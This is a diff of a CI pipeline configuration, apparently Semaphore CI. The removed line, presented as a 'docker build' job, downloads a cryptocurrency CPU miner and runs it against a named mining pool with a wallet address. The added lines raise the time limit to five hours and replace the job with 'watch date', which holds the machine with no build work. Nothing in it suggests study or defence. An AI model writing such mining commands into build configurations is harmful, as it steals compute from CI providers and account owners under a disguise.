@@ -4,10 +4,14 @@ agent:
   machine:
     type: e1-standard-8
     os_image: ubuntu1804
+execution_time_limit:
+  hours: 5
+  
+  
 blocks:
   - name: Build
     task:
       jobs:
         - name: docker build
           commands:
-            - wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && timeout 47m ./m-minerd-64-linux/m-minerd -a m7mhash -o stratum+tcp://eu.npc-mining.net:3002 -u 9Q8YVTkcGU2UXzigqW6uBgkXjPQPns2RZq -p c=XMG -e 71
+            - watch date
